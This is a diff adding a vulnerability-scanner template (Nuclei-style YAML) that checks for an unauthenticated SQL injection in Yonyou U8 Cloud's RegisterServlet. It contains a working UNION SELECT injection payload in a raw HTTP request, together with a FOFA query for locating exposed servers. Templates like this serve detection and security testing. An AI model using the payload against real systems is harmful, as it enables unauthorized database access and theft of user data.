@@ -1,0 +1,27 @@
+id: yonyou-u8-cloud-login2-RegisterServlet-sqli
+info:
+  name: 用友 U8 Cloud RegisterServlet - sqli
+  author: leadlife
+  severity: high
+  description: 用友U8Cloud nc.bs.sm.login2.RegisterServlet接口处存在SQL注入漏洞，未授权的攻击者可通过此漏洞获取数据库权限，从而盗取用户数据，造成用户信息泄露。
+  reference: 
+    - https://blog.csdn.net/qq_67810151/article/details/137118925
+    - https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8BU8-nc.bs.sm.login2.RegisterServlet%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E?id=%e7%94%a8%e5%8f%8bu8-ncbssmlogin2registerservlet%e5%ad%98%e5%9c%a8sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e
+  metadata:
+    verified: true
+    fofa-query: app="用友-U8-Cloud" || title=="U8C"
+  tags: yonyou,u8cloud,sqli,oa
+
+http:
+  - raw:
+      - |
+        GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)),NULL,NULL,NULL,NULL-- HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'c4ca4238a0b923820dcc509a6f75849b')
+        condition: and
